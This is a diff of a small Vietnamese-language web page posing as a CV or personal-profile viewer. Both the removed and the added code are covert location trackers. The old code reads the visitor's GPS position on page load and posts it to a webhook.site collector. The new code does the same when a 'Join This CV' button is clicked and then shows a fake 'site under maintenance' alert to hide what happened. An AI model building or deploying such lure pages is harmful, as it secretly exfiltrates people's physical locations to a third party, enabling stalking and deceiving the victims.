@@ -2,34 +2,37 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>My info</title>
-  <script>
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        fetch("https://webhook.site/75b705ea-f6af-4628-9609-9c83e062bdbc", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString()
-          })
-        });
-      },
-      function(error) {
-        console.error("Lỗi GPS:", error);
-      }
-    );
-
-    // Redirect sau 2 giây (để đảm bảo gửi xong trước)
-    setTimeout(function() {
-      window.location.href = "https://webhook.site/75b705ea-f6af-4628-9609-9c83e062bdbc";
-    }, 2000);
-  </script>
+  <title>Thông tin cá nhân</title> 
 </head>
 <body>
+  <h2>Xem hồ sơ</h2>
+  <button onclick="sendLocation()">Join This CV</button>
+
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const ts = new Date().toISOString();
+
+            const url = `https://webhook.site/75b705ea-f6af-4628-9609-9c83e062bdbc?lat=${lat}&lon=${lon}&acc=${acc}&ts=${encodeURIComponent(ts)}`;
+
+            fetch(url)
+              .finally(() => {
+                alert("Web đang bảo trì");
+              });
+          },
+          function(error) {
+            alert("Web đang bảo trì");
+          }
+        );
+      } else {
+        alert("Web đang bảo trì");
+      }
+    }
+  </script>
 </body>
 </html>
